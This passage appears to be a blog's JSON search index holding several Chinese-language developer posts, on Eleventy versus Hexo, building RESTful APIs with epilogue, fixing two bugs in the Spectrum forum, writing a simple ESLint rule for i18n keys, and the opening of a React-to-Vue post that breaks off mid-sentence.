workaround 我目前是設成一秒後才清空 query string。 第四個是分頁，這模板的 pagination navigation 要自己做，幸好官網已經有詳細範例了：PAGINATION NAVIGATION。 第五個是有些優化似乎有一點問題，例如說 &lt;head&gt; 標籤會變不見，可能是被誤以為是可以省略的標籤了，導致的後果就是如果有用 GA 或 search console，你會沒辦法靠在 head 加東西去做驗證，我目前是先把 removeOptionalTags 給拿掉。 第六個是 SEO 有些 tag 不完整，例如說 twitter:title、og:site_name、og:type 這些沒有加上去，雖然說應該還是可以自動抓到一些東西，但寫清楚還是比較好的。 其實我覺得都是一些小問題啦，比較細節的地方。 總結以前我就研究過寫 blog 到底要用哪一套了，那時候除了 hexo 也沒其他好選的，hugo 或是老牌 jekyll 都沒 hexo 習慣。版型的部分是看 Askie 用的版型很不錯，就也選用同個版型。 但用久了也發現一些缺點，就是網站有點太肥（我剛發現好像大部分都是 disqus 的東西，找到戰犯了，不是模板的問題而是 disqus，之後再來仔細看看），除此之外倒是沒什麼問題。 而這次因為要架新的部落格的關係開始看別套，發現 11ty 真的挺不錯的，效能確實很好，不過那個 high performance 的版型跟 hexo 比的話確實是比較陽春，如果不喜歡這麼簡潔的話，就是要自己再多花點心力去調整了。 總之呢，我用起來的整體感覺滿不錯的，而且自己動手去修 bug 或是加功能，也都會讓自己更參與在其中。 如果你喜歡簡潔快速的部落格版型，而且不排斥自己動手加新功能或是調整版面，誠心推薦你 eleventy-high-performance-blog。","link":"/2021/08/22/eleventy-over-hexo/"},{"title":"用 Node.js 快速打造 RESTful API","text":"（原文發表於：http://blog.techbridge.cc/2016/04/23/fast-restful-nodejs-api-backend/） 前言現今有些網站採用了 Single Page Application 的方案，後端只負責提供 API 讓前端抓取資料，達成完全的前後端分離。前端的選擇有很多種，你可以用 Angular，可以用 Ember.js，也可以用 React + Redux。至於後端的 API，必須符合固定格式，才能讓前端的人員比較好抓取。而這個「固定格式」，最常見的就是我們今天的重點：RESTful。 什麼是 RESTful？與起從硬生生的文字解釋下手，不如先從實際範例著手。假設現在你要寫一個部落格網站的後端 API，十個人可能會有十種寫法；例如說「抓取所有文章」這個功能： &#x2F;api&#x2F;blog&#x2F;getList &#x2F;api&#x2F;blog&#x2F;getAllArticle &#x2F;api&#x2F;blog&#x2F;article&#x2F;getAll &#x2F;api&#x2F;blog&#x2F;fetchAll &#x2F;api&#x2F;blog&#x2F;all 但如果是採取 RESTful 的方案，就會符合一定的格式： 操作 Method URL 所有文章 GET &#x2F;api&#x2F;posts 單一文章 GET &#x2F;api&#x2F;posts&#x2F;:id 新增文章 POST &#x2F;api&#x2F;posts 刪除文章 DELETE &#x2F;api&#x2F;posts&#x2F;:id 修改文章 PUT&#x2F;PATCH &#x2F;api&#x2F;posts&#x2F;:id 在這個例子裡，文章（posts）是一個 Resource，你可以透過 HTTP 提供的幾種方法搭配不同的 URL 存取這個 Resource。 如果你對 RESTful 很有興趣，這邊是一些值得參考的文章： 什麼是REST跟RESTful? 淺談 REST 軟體架構風格 理解RESTful架構 ORMORM 的全稱是：Object Relational Mapping如果以資料庫來說的話，就是把你的資料庫對應到程式裡的物件。舉上面的部落格的例子，你的資料庫 table 可能是這樣： 欄位 類型 說明 id int id title text 標題 content text 內文 created_at timestamp 建立時間 對應到 Node.js 裡面的物件，你可以這樣： // 建立文章 Post.create(&#123; title: 'Hello Excel', content: '測試' &#125;) // 刪除 id 為 1 的文章 Post.find(1).delete(); 也就是說，你今天根本不用管背後的資料庫用的是哪一種，也不用管 table 的名稱到底是什麼，你只要對你知道的這個 Post 物件做操作即可。 Sequelize是一套很好用的 ORM Library，只要先定義好一份schema，就可以幫你把物件跟資料庫關連起來。 為什麼突然提到 ORM？有些讀者可能已經想到，其實 RESTful API 跟 ORM 之間，是有某種程度的關聯的。怎麼說呢？ 假設我今天要寫一個留言板的後端 API，而且我又同時採用 RESTful 跟 ORM，我的程式就會長這樣： // 抓取所有留言 // GET /api/messages Message.findAll(); // 抓取單一留言 // GET /api/messages/:id Message.find(id); // 新增留言 // POST /api/messages Messages.create(&#123; content: content &#125;) // 刪除留言 // DELETE /api/messages/:id Messages.find(id).delete(); // 修改留言 // PUT /api/messages/:id Messages.find(id).update(&#123; content: new_content &#125;) 那如果我今天是寫一個部落格的後端 API 呢？把上面的 messages 全部換成 posts，搞定！從以上例子可以看出，其實這兩樣東西是很適合搭配在一起的，因為兩個都能夠符合差不多的規則。 兩個願望一次滿足，epilogueepilogue 是一套 Node.js 的 Library，它結合了 Sequelize 跟 Express，主要目的就是讓我們能快速打造出 RESTful 的 API。 讓我們直接來看看官網的範例： 首先，你要先定義好的資料庫，跟你的 schema var database = new Sequelize('database', 'root', 'password'); var User = database.define('User', &#123; username: Sequelize.STRING, birthday: Sequelize.DATE &#125;); 再來，初始化 express 跟 epilogue var express = require('express'), bodyParser = require('body-parser'); var app = express(); app.use(bodyParser.json()); app.use(bodyParser.urlencoded(&#123; extended: false &#125;)); server = http.createServer(app); epilogue.initialize(&#123; app: app, sequelize: database &#125;); 最後，靠 epilogue 把 url 跟資料庫關連起來，你要提供它你想要的 endpoint 跟要關連的 model var userResource = epilogue.resource(&#123; model: User, endpoints: ['/users', '/users/:id'] &#125;); 就是這樣簡單三個步驟，你就有了一個 RESTful API！是不是很簡單呢？ 還不只這樣在實際的開發過程中，其實往往沒有那麼順利，例如說你的回傳格式可能跟資料庫的格式不一樣，或是你的某些 API 需要經過認證才能呼叫。沒關係，epilogue 都幫你想好了。 epilogue 提供了七種行為的 hook，包括 start, auth, fetch, data, write, send, complete，再搭配上 before, action, after 三種，你可以在任何一個階段做你想做的事情。 例如說你想在傳回結果之前做一點小小的變更，就是userResource.list.send.before，或是你可能想對某個 API 做驗證，那就是userResource.delete.auth。 這邊提供兩個官網的完整範例： // 禁止刪除 user userResource.delete.auth(function(req, res, context) &#123; throw new ForbiddenError(\"can't delete a user\"); &#125;) // 先看有沒有 cache，有的話直接返回 cache 的內容 userResource.list.fetch.before(function(req, res, context) &#123; var instance = cache.get(context.criteria); if (instance) &#123; // keep a reference to the instance and skip the fetch context.instance = instance; return context.skip; &#125; else &#123; // cache miss; we continue on return context.continue; &#125; &#125;) 總結若是你的後端 API 沒有很複雜，都是基本的 CRUD 的話，那 epilogue 絕對是很適合你的一套框架，只要你把資料庫的 schema 開出來，程式碼複製貼上一下就能夠完成一個 API。若是讀者之後有相關的需求，不妨試試看吧！","link":"/2016/09/29/fast-restful-nodejs-api-backend/"},{"title":"記一次幫開源專案 spectrum 修 bug 的經歷","text":"前言最近又開始了自己的教學計畫，第一期的時候寫了這篇：利用 Github Classroom 加 Travis CI 打造改作業系統，第二期寫了這篇：AWS Lambda + GitHub API + Google Sheet &#x3D; 自動化簽到系統，都是利用現成工具來快速湊出符合自己需求的系統。 而第三期開始前我希望課程能有個討論區，讓學生們可以在上面很方便地問問題。一直以來都是用 Slack，但 Slack 最大的缺點就是免費版會吃訊息，很多不錯的資訊被洗掉就覺得滿可惜的，希望能有個論壇或是討論區之類的地方會比較好。 在兩年前我也寫過一篇：自架論壇的解決方案：flarum, github issue, nodeBB, discourse，研究了幾套方案，最後選擇 GitHub Issue。因為最簡單、最方便，但最大的缺點是學生好像不太習慣，因為左看右看上看下看其實都不像是個論壇。 前陣子因緣際會之下知道了這一個平台：spectrum，首頁的 slogan 寫得很清楚： The community platform for the future. 去年被 GitHub 買下來之後變成完全免費的，以前付費版的功能也變免費了。在我看來，其實就是「更像討論區」的 Slack。先給大家看一張截圖： 最左邊是不同的 workspace，這跟 Slack 一樣。再來你可以看到各個 Channles，這跟 Slack 也一樣，唯一不同的是右邊，原本 Slack 的訊息變成了一個個討論串，有標題跟內文。 這樣你大概可以懂我在說什麼了，這套跟 Slack 很像，但是更適合當作是討論區。 免費、背後是 GitHub、可以有 private 的論壇、開源，這簡直是完美的解決方案。除了沒有手機 App 以外，其他沒什麼可以挑剔的，就決定是這一套了！ 事情沒有那麼順利…開始試用幾天之後，發現有一個超級大問題，雖然說在功能上沒什麼問題，但是在體驗上我覺得極差，這一個小缺點就足夠讓我放棄這個平台。 是什麼問題呢？排版。 spectrum 原生支援 Markdown，使用起來十分順手，可是換行卻出了問題。在有些地方只有空行是沒有用的，結尾要加兩個空格才會換行，雖然我覺得這很不方便，但勉強可以接受。 可是！在 spectrum 上面，要兩個換行才會真的換行。 底下是範例，最下面的 line1 跟 line2 應該要換行： 可是 po 文之後卻會變成這樣： 換行變成了空格，如果是英文還好，但如果是中文的話排版就變得超級無敵奇怪，完全不能接受。 心灰意冷的我去了官方討論區發文，想說會不會有什麼其他換行的方法只是我不知道。 結果官方給我的回覆是：「對，現在你只能換行兩次才會真的換行」。 原本槁木死灰的我想說那就乾脆放棄吧，研究看看有沒有其他解法，甚至還一度想說要不要自己寫一套出來，但一想到要支援一大堆功能就覺得很麻煩，遲遲無法下定決心。 經過幾天的深思之後，覺得 spectrum 這個平台真的很好，但唯一的缺點就是排版問題，如果這個缺點解決了，沒道理不用它。 馬特拉不拉，我們自己拉。官方有 bug 沒空修，沒關係，我們自己修！這就是開源的好處。 修 bug 之旅要幫開源專案修 bug 的第一步很簡單，就是想辦法把整個環境跑起來。你要有辦法在本機跑起來才有辦法驗證自己到底有沒有修成功，所以官方文件是很重要的。 spectrum 的文件很齊全，有一連串的指示告訴你應該要怎麼做。照著做之後，就能把前後端都在自己的 local 跑起來了。 在等待安裝這些套件的途中，可以自己稍微猜一下問題出在哪裡。那時的我猜說應該是 markdown 的編輯器出了什麼問題，可能在把 markdown 轉成 HTML 的時候出了問題，沒有處理好，所以少了換行。 光猜是沒有用的，第一步要縮小問題範圍並且定位問題，先找出最重要的發文這一段到底發生了什麼事情。 在 Chrome 我們可以用 React Devtool，看到發文的介面是一個叫做 composer 的 component。接著在 composer&#x2F;index.js 裡面可以看到是由一個叫做 Inputs 的元件負責。 在 Inputs.js 裡面發現了一件驚人的事情，原來按下 Preview 的時候，會直接送 request 到一個寫死的路徑並且把結果顯示出來： const onClick = (show: boolean) => &#123; setShowPreview(show); if (show) &#123; setPreviewBody(null); fetch('https://convert.spectrum.chat/from', &#123; method: 'POST', body, &#125;) .then(res => &#123; if (res.status &lt; 200 || res.status >= 300) throw new Error('Oops, something went wrong'); return res.json(); &#125;) .then(json => &#123; setPreviewBody(json); &#125;); &#125; &#125;; 既然轉換是 Server 做的，那接下來就要來找找 Server 到底做了什麼。 可是我又不知道https://convert.spectrum.chat/from是對應到 Server 的哪裡，要怎麼找到 Server 是怎麼處理的呢？ 這邊可以換一個想法，雖然說預覽的時候的確是送到這邊沒錯，但是發文的時候 Server 一定也會處理這個格式轉換，所以可以先找出發文的時候 Server 到底做了什麼，應該會有一些線索。 接著在前端發文之後查看 Network tab，因為後端是 GraphQL 所以滿好看的，是一個叫做publushThread的操作。 立刻往 Server 的部分找，循線找到了這個檔案：publishThread.js，並且發現裡面呼叫了一個 processThreadContent 來做轉換。 往下追這個 function，看程式碼之後發現這應該是最底層了： // @flow import &#123; stateFromMarkdown &#125; from 'draft-js-import-markdown'; import &#123; convertFromRaw, convertToRaw, EditorState &#125; from 'draft-js'; import &#123; addEmbedsToEditorState &#125; from './add-embeds-to-draft-js'; export default (type: 'TEXT' | 'DRAFTJS', body: ?string): string => &#123; let newBody = body; if (type === 'TEXT') &#123; // workaround react-mentions bug by replacing @[username] with @username // @see withspectrum/spectrum#4587 newBody = newBody ? newBody.replace(/@\\[([a-z0-9_-]+)\\]/g, '@$1') : ''; newBody = JSON.stringify( convertToRaw( stateFromMarkdown(newBody, &#123; customBlockFn: elem => &#123; if (elem.nodeName !== 'PRE') return; const code = elem.childNodes.find(node => node.nodeName === 'CODE'); if (!code) return; const className = code.attributes.find( (&#123; name &#125;) => name === 'class' ); if (!className) return; const lang = className.value.replace('lang-', ''); return &#123; type: null, data: &#123; language: lang, &#125;, &#125;; &#125;, parserOptions: &#123; atomicImages: true, breaks: true, &#125;, &#125;) ) ); &#125; // Add automatic embeds to body try &#123; return JSON.stringify(addEmbedsToEditorState(JSON.parse(newBody || ''))); // Ignore errors during automatic embed detection &#125; catch (err) &#123; console.error(err); return newBody || ''; &#125; &#125;; 而且沒有看出任何跡象，看起來一切正常。此時的我想說：該不會要往下追到 draft-js 或是其他的 library 吧？ 但是既然都找到這了，應該先來看一下它轉出來會是什麼東西，再決定下一步該怎麼辦，於是我在這個 function 加了 log，把它最後轉換的東西印出來。 我的輸入是： oneline newline thirdline fourline fiveline 輸出是： &#123; \"blocks\":[ &#123; \"key\":\"bq56i\", \"text\":\"oneline\\nnewline\\nthirdline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125;, &#123; \"key\":\"9h38b\", \"text\":\"fourline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125;, &#123; \"key\":\"fuprm\", \"text\":\"fiveline\", \"type\":\"unstyled\", \"depth\":0, \"inlineStyleRanges\":[], \"entityRanges\":[], \"data\":&#123;&#125; &#125; ], \"entityMap\":&#123;&#125; &#125; 不印則已，一印驚人！ 沒想到上面的測資轉換出來是：&quot;text&quot;:&quot;oneline\\nnewline\\nthirdline&quot;，看來 Server 的轉換完全正常，換行被轉為\\n，兩個換行被轉為一個新的 block，看來問題是出在前端沒有把這個換行好好輸出。 接著再用差不多的方法一樣用 React Devtool 來看，發現前端顯示是 threadDetail.js 在處理，而裡面呼叫了 threadRenderer.js，看來這就是真的 render 的地方了。 找到 threadRenderer.js 之後，發現裡面只是單純地呼叫了 redraft 這個 library。 好，雖然又有新的東西要研究，但離答案愈來愈近了。 仔細看了一下 redraft 的文件，看起來是可以自定義每一個型態最後的輸出要長什麼樣子。往下把官方文件看完，發現有一區是 Common issues ，裡面寫著： Can the multiple spaces between text be persisted? Add white-space: pre-wrap to a parent div, this way it will preserve spaces and wrap to new lines (as editor js does) 看到這邊，答案已經很明顯了，就是前端顯示忘記加 white-space: pre-wrap，所以預設的行為會把換行當作是空格。 真相大白的時候我在心裡暗罵了一聲髒話，但是是罵自己。因為這問題在前端其實滿常見的，我也用過這屬性很多次。可是在我看到這問題的時候我第一點居然是往後端去懷疑，完全沒想到有可能是前端的問題，更沒有想到原來是加一行 CSS 就可以搞定的事。 接著就先發了一個 Issue 記錄了一下調查的過程跟成因，然後發了個 PR，雖然只是改這麼一行而已，但是對我意義重大。因為只要這個 bug 修好，這套就立刻海放其他現成的論壇系統。 他們的速度很快，發 PR 之後隔天就被 merge 了，再隔個一週就被 deploy 到 production 了，真的很有效率。 意猶未盡，再修一個！雖然只有一行，但探索的過程獲益良多，而且 PR 能被 merge 就很開心。既然都修了一個，那來找找看有沒有其他容易修的好了，可以一起順手修掉。 在官方的 Issues 翻一翻，找到一個看起來不難的：Weird image failed rendering in thread body，這個 Issue 很簡單，就是不知道為什麼會出現下面的 bug： 文字覆蓋住了後面的圖片。 Issue 裡面有附上原文網址，點進去以後用 devtool 看了一下，發現問題出在當瀏覽器無法載入 img 標籤的圖片時，就會變成這樣。 我之前完全沒碰過這問題，但自己試了一下，發現 img 原本有 margin，可是在圖片沒辦法載入的時候會失效。直覺告訴我這可能是 margin collapsing 有關的問題。 後來我自己試了一下，問題出在當圖片無法載入，img 的高度就會變成 0，然後 margin 就會失效。因為一些排版跟 CSS 的元素，下面的文字就會蓋上來，變成下面的圖片那樣。 那有什麼好解法嗎？ 我發現一個最簡單的解法就是加上 alt 屬性，當圖片無法載入時就會就會顯示這個文字，img 就能保有高度，margin 也能作用。 查到解法之後一樣先回在 Issue 下面跟他們討論，看他們覺得如何。 後來我發現原本上傳圖片時其實就有設定 alt，但可能在一些邊界條件下會是空的，或者是使用者手動把 alt 移除掉。 所以最後的解法也很簡單，就是幫 alt 加一個預設值，PR: Add default alt text to img： - &lt;img key&#x3D;&#123;key&#125; src&#x3D;&#123;data.src&#125; alt&#x3D;&#123;data.alt&#125; &#x2F;&gt;, + &lt;img key&#x3D;&#123;key&#125; src&#x3D;&#123;data.src&#125; alt&#x3D;&#123;data.alt || &#39;Image&#39;&#125; &#x2F;&gt; 總結雖然只有貢獻了兩行，但能看到自己的帳號出現在 release log 上面還是滿開心的： 如果是以前的自己，我絕對不會幹這種事。絕對是發現 bug 之後就停住了，然後等著官方團隊來修 bug。 但這幾年漸漸開始熟悉起看其他人的 code，工作的時候偶爾沒事就可以看一下 redux-form 或是 redux 的 source code 等等，看著看著覺得也沒那麼可怕。而且 GitHub 還有個超好用功能叫做「搜尋」，很多時候直接搜關鍵字就能找到相關的原始碼，節省超級多時間。 在看其他人的專案時，我覺得最難的是定位問題，一但你定位問題之後其他都沒那麼難了，因為你已經知道是哪個檔案、哪段程式碼有問題，接著只要朝那邊去研究就好。至於該怎麼定位問題，有以下幾個建議： 直接搜尋程式碼，看能不能找到相關段落 利用 devtool 找出相關的元件 看文件，看上面有沒有附一些架構 當你要修 bug 的時候，方向是很明確的，沒有必要整個專案都看過，只要找到你要修的地方就好。這一篇希望能分享我的經驗給大家。 最後，當個工程師真好，有開源專案真好，有 bug 都可以自己修掉。","link":"/2019/04/19/fix-spectrum-bug/"},{"title":"寫一個簡單堪用的 ESLint plugin","text":"前言只要是開發 JavaScript 相關的專案，我的起手式通常都是 ESLint + Prettier，如果你沒有聽過這兩套的話我稍微講一下，Prettier 是幫你格式化程式碼用的，用了之後不必再跟其他人爭論到底要不要加分號，if 區塊的 &#123; 要不要換行，一行最多到底能幾個字。只要用 Prettier，就是讓它幫你全權決定（雖然也有設定檔可以調整就是了）。 這其實對團隊滿有幫助的，因為程式碼格式可以統一，要空幾格也可以統一，在基本的 coding style 上面會長差不多。而 ESLint 雖然也有些跟格式相關的部分，但更多的是寫程式時候的一些 best practice，例如說使用變數前要先宣告、不會更改的變數用 const 之類的，這已經脫離了格式的範圍。 所以 ESLint 搭配 Prettier，就可以讓整個 codebase 的品質有最低限度的保障，至少不會出現排版很慘烈的狀況。而使用 ESLint 時最多人搭配的規則應該就是 Airbnb JavaScript Style Guide，裡面有每一條規則的詳細解釋。 之前在寫 code 時我突然想到一個地方好像很適合用 ESLint，就嘗試了看看，發現要做一個「堪用」的 plugin 比想像中簡單一些，就以這篇文章記錄一下過程跟心得。 問題背景當時碰到的狀況是這樣的，在專案裡面我們用 react-i18next 來管理 i18n 相關的東西，一段程式碼可能會長得像下面這樣： import &#123; useTranslation &#125; from 'react-i18next' import &#123; NS_GENERAL &#125; from '@/i18n/namespaces' function Hello() &#123; const &#123; t &#125; = useTranslation(NS_GENERAL) return ( &lt;div>&#123;t('welcome_message')&#125;&lt;/div> ) &#125; 使用 useTranslation 可以拿到一個 function t，把 key 丟進去之後就可以得到翻譯後的字串，而背後對應到的會是多個語言檔： // en-us/general.json &#123; \"welcome_message\": \"Hello!\" &#125; // zh-hant/general.json &#123; \"welcome_message\": \"你好！\" &#125; 這就是 i18n 的基本原理，語言檔加上對應的 key，就可以根據不同語言顯示不同的文字。看起來雖然簡單，但 i18n 比較麻煩的事情之一就是當你有參數的時候，在這邊就先不多提了。 而我們通常不會把所有翻譯都放在同一個檔案裡面，會用 namespace 去切分，至於要怎麼切就看專案，有些可能根據頁面分，有些根據使用到的地方，例如說上面提到的 general，可能就會是比較常見的、需要共用的翻譯： // en-us/general.json &#123; \"contact_us\": \"contact us\", \"close\": \"close\", \"try_again\": \"Please try again\" &#125; // zh-hant/general.json &#123; \"contact_us\": \"聯絡我們\", \"close\": \"關閉\", \"try_again\": \"請再試一次\" &#125; 而登入或是身份驗證相關頁面專屬的翻譯，可能會長這樣： // zh-hant/auth.json &#123; \"username_error\": \"使用者名稱格式錯誤\", \"password_error\": \"帳號或密碼輸入錯誤\", \"login_success\": \"登入成功！\" &#125; 把翻譯切分成不同的 namespace 的好處就在於我在瀏覽 A 頁面的時候，就不需要把 B 頁面的翻譯一起下載下來，用到哪個就下載哪個，節省資源。 當一個 component 需要用到多個 namespace 的時候有幾種不同的寫法，有一種寫法會是這樣用： import &#123; useTranslation &#125; from 'react-i18next' import &#123; NS_GENERAL, NS_AUTH &#125; from '@/i18n/namespaces' function Page() &#123; const &#123; t: tGeneral &#125; = useTranslation(NS_GENERAL) const &#123; t: tAuth &#125; = useTranslation(NS_AUTH) return ( &lt;div> &#123;tGeneral('contact_us')&#125; &lt;p>&#123;tAuth('login_success')&#125;&lt;/p> &lt;/div> ) &#125; 好，第一個問題來了。 當 team member 人少時，例如說只有一兩個，大家的命名會一致，比如說對於 authorization 這個 namespace，就是命名成 const &#123; t: tAuthorization&#125; = useTranslation()，但當人多了以後可能會有人簡寫成 const &#123; t: tAuth &#125;，雖然說這不是什麼大問題，但我認為同一個 codebase 裡面出現多種不同的命名狀況，能避免的話還是避免掉會比較好。 那要怎麼避免呢？一種就是在 code review 的時候自己去抓出來，但這個沒什麼效益而且花時間，另一種你應該已經想到了，就是透過 ESLint！像是這種可以交給程式去做的事情，交給程式就對了。 而 i18n 還有另外一個問題，那就是有時候我們工程師拿到 key 了，但是其他部門其實還沒有把這個 i18n key 新增到語言檔裡面，在畫面上就會看到裸露的 key。像這種情況，其實也可以透過 ESLint 把沒配對到的 key 抓出來，在部署前就提前知道哪些 key 是不存在的。 綜合以上想法，那時候我就想寫兩個 rule： 檢查 namespace 是不是用的 alias 都一樣 檢查哪些 key 存在在程式碼裡面，卻不在語言檔裡 想要寫一個堪用的 ESLint plugin 不難，需要的基礎知識在這一篇：透過製作 Babel-plugin 初訪 AST 都有，稍微了解一下 AST 即可，當初我也是看這一篇然後邊看邊弄的，底下我就預設大家看過這篇了，直接來講應該怎麼弄。 實戰首先第一件事情就是打開我們強大的 AST Explorer，在 transform 那邊選擇 ESLint，就會看到左下角自動載入了範本： export default function(context) &#123; return &#123; TemplateLiteral(node) &#123; context.report(&#123; node, message: 'Do not use template literals', fix(fixer) &#123; if (node.expressions.length) &#123; // Can't auto-fix template literal with expressions return; &#125; return [ fixer.replaceTextRange([node.start, node.start + 1], '\"'), fixer.replaceTextRange([node.end - 1, node.end], '\"'), ]; &#125;, &#125;); &#125; &#125;; &#125;; 會發現 ESLint 跟 babel 其實都是一樣的，可以針對某個特定的節點去做操作，而 ESLint 是用 context.report 來回報錯誤，message 就是你會在 console 看到的那些錯誤，fix 則是給 auto fix 功能用的，這個比較複雜一點，我們先不管它。 再來呢，就是在左上角先把我們的範例程式碼給寫好： import &#123; useTranslation &#125; from 'react-i18next' import &#123; NS_GENERAL, NS_AUTH &#125; from '@/i18n/namespaces' function Page() &#123; const &#123; t: tGeneral &#125; = useTranslation(NS_GENERAL) const &#123; t: tAuth &#125; = useTranslation(NS_AUTH) return ( &lt;div> &#123;tGeneral('contact_us')&#125; &lt;p>&#123;tAuth('login_success')&#125;&lt;/p> &lt;/div> ) &#125; 接著直接在右邊看 AST，我們關心的是 Variable Declarator 再繼續往下看 AST，你會發現 const &#123; t: tGeneral &#125; = useTranslation(NS_GENERAL) 可以先簡單分為兩個部分，左邊的 &#123;t: tGeneral&#125; 跟右邊的 useTranslation(NS_GENERAL)。 左邊是在這個 Variable Declarator node 的 id 的地方，右邊則是 init 的地方。 init 點下去會看到 callee 跟 arguments callee.name 就是 useTranslation，arguments[0].name 則是 NS_GENERAL。 而另外一邊 id 點下去可以找到 properties[0].key.name 是 t，properties[0].value.name 是 tGeneral 有了這些之後，其實我們想找的元素都找齊了，就可以根據 AST 的這些節點位置來寫一段基本的程式碼： // 正確的命名 const NS_RULES = &#123; NS_GENERAL: 'tGeneral', NS_AUTH: 'tTest' &#125; export default function(context) &#123; return &#123; VariableDeclarator(node) &#123; // 判斷是不是 useTranslation if (node.init.callee.name === 'useTranslation') &#123; // 抓出 namespace 跟 alias const ns = node.init.arguments[0].name const alias = node.id.properties[0].value.name if (alias !== NS_RULES[ns]) &#123; context.report(&#123; node, message: `Wrong alias, should use $&#123;NS_RULES[ns]&#125;`, &#125;) &#125; &#125; &#125; &#125; &#125; 結果會長這樣： 其實我們只是根據 AST 上的節點內容去做簡單的判斷，但是只要做到這邊，差不多就完成八成了，上面的結果其實已經是我們要的了。 但是我們的 ESLint plugin 其實太針對範例程式碼，所以只要輕輕改一下就會壞掉，例如說加一行 var a，就會跑出錯誤：Cannot read property &#39;callee&#39; of null，這是因為 var a 的 type 也是 VariableDeclarator，只是 init 是 null，因為 init.callee 就報錯了。 其實這些語法可以有各種的組合，所以最後節點的長相有超級多種可能，標題之所以寫「堪用」，就是因為我不想努力了，針對 i18n 的使用場景程式碼結構都會長一樣，所以我只要針對一種就好。如果是這樣的話，只要用最新的 optional chaining 就可以避免這種存取錯誤的問題： // 正確的命名 const NS_RULES = &#123; NS_GENERAL: 'tGeneral', NS_AUTH: 'tTest' &#125; export default function(context) &#123; return &#123; VariableDeclarator(node) &#123; // 判斷是不是 useTranslation if (node.init?.callee?.name === 'useTranslation') &#123; // 抓出 namespace 跟 alias const ns = node.init?.arguments?.[0]?.name const alias = node.id?.properties?.[0].value?.name if (alias !== NS_RULES[ns]) &#123; context.report(&#123; node, message: `Wrong alias, should use $&#123;NS_RULES[ns]&#125;`, &#125;) &#125; &#125; &#125; &#125; &#125; 不過 AST Explorer 好像還沒支援 optional chaining 就是了。 寫到這邊，其實我們的目標就已經達成了，寫出一個會幫你抓錯誤的 alias 的 ESLint rule。不過這個寫法其實有幾個缺陷，那就是我們把東西寫太死，所以結構變了就抓不出來了，例如說： var a &#x3D; NS_AUTH const &#123; t: tAuth &#125; &#x3D; useTranslation(a) plugin 所抓到的 namespace 就會是 a，而不是 NS_AUTH，但如果有做好處理的話，應該是可以去找 a 的值發現是 NS_AUTH。不過前面我講過了，因為這個 i18n 使用的時候結構都會一樣，所以暫時不會碰到這種問題。 另外一個找出遺漏的 key 其實也是一樣的做法，就是根據 AST 找出 function call，然後呼叫的 function 名稱是我們剛剛定義好的那些像是 t, tGeneral, tAuth 之類的，把參數取出來，就是應該要存在的 i18n key，接著去語言檔裡面找一下是否存在。 簡單做個示範： // 正確的命名 const NS_RULES = &#123; NS_GENERAL: 'tGeneral', NS_AUTH: 'tAuth' &#125; // 應該從語言檔讀入 const KEYS = ['contact', 'login_success'] export default function(context) &#123; return &#123; CallExpression(node) &#123; if (Object.values(NS_RULES).includes(node.callee.name)) &#123; if (!KEYS.includes(node.arguments[0].value)) &#123; context.report(&#123; node, message: `i18n key: $&#123;node.arguments[0].value&#125; not found` &#125;) &#125; &#125; &#125; &#125; &#125; 結果會長這樣： 只要掌握 AST 的結構依樣畫葫蘆，就可以快速寫出一個簡單堪用的 ESLint plugin。 結語這篇寫出來的 ESLint plugin 我大概會用「簡陋」來形容，就是滿足了最低限度的需求而已，沒有 options 可以調整，也沒有對比較複雜的狀況做處理。 如果你要寫一個沒那麼簡陋的 ESLint plugin，其實不是一件簡單的事，就舉 no-alert 為例好了，裡面需要考慮到不同狀況以及 options 的設置，原始碼在這邊：eslint&#x2F;lib&#x2F;rules&#x2F;no-alert.js。 這篇算是做個小嘗試而已，先寫寫看比較針對性而且簡單的的規則來入門，未來如果還有類似的需求，可以再研究該怎麼寫得更完整。 參考資料： How To Write Your First ESLint Plugin Create custom ESLint rules in 2 minutes","link":"/2021/03/20/eslint-plugin/"},{"title":"從 React 到 Vue 的心得感想","text":"如果有看過我的部落格的話，應該會知道我一直都是寫 React，完全沒有碰過 Vue，也沒有碰過 Angular。自從 2015 年接觸到 React 後，工作上就一直是用 React 了。 然而，最近因為工作上的需求，所以開始寫 Vue 了，而剛好也有讀者來問我從 React 跳到 Vue 的心得，因此這邊就簡單寫一篇來分享。 在開始之前…雖然說要講從 React 跳到 Vue 的感想，但先讓我偷渡一下對於 Next.js 13.4，也就是 app router 搭配 RSC（React Server Components）的感想。照理來說應該要開另外一篇的，但篇幅不夠長，因此就偷渡在這裡了。 如果沒興趣的話，可以直接跳到下一段。 在目前的公司，React 跟 Vue 都會碰到，而且版本都滿新的，前者是 Next.js 14（剛用的時候是 13.4，第一個有 RSC 的版本），後者則是 Vue3。 因為都用了 Next.js 的最新版本，所以直上 RSC，想來體驗這個 React 未來的重點技術之一，先講結論：「不能只有我受苦，趕快來用」。 （話說如果還不清楚 RSC 是什麼，或是容易跟 SSR 搞混的話，建議可以先看這兩篇文章：RSC From Scratch. Part 1: Server Components 以及 Understanding React Server Components） 根據 RSC 的設計原則，如果運用得當的話，你的 bundle size 會變小，網站的性能也可能會變好，但我自己用過之後，認為它帶來的效益遠低於引進這項技術所增加的複雜度。 不過先強調一下，因為我用的是 Next.js 的 RSC，不代表所有的 RSC 都是同個樣子，所以這整段講的都會是「Next.js 的 RSC 的使用心得」，而不是「RSC 的使用心得」。 先來講缺點好了。 首先，光是要正確理解 client component 跟 server component 就需要一些時間，可能是嘗試的時間太早，甚至連 Next.js 的官方文件都寫得不是很清楚，需要自己一直不斷嘗試才能試出來到底是什麼樣子（例如說之前前端社群有一篇貼文就在問這個，我當初也有類似的疑惑）。 再來的話，未來在寫 component 的時候都會需要考慮到這個是 client 還是 server 還是都可以，會增加心智負擔。 還有就是許多 server component 可能會直接打 API 去拿資料，因此 client 在拿到資料時，就已經是 render 好的結果了。雖然乍看之下不錯（畢竟是 RSC 的賣點），但這其實會讓前端變得很難 debug。 以前除了第一次的 SSR 以外，我只要打開 DevTools，就可以看到前端發了哪些請求，API 的 response 是什麼，但換成 server component 以後我看不到了，我只能看 server log 才能知道發生了什麼事情。 如果出事的話，我從前端沒辦法區分出是我的 Next.js server 出錯，還是我呼叫的 API 那邊出錯，這點在開發者體驗上扣分許多。 但以上這些其實都還好，最雷的是 Next.js 13.4 的推出有點太趕，要嘛很多功能都沒有做好，要嘛是文件沒有寫清楚。 舉例來說，Next.js 有一個叫做 middleware 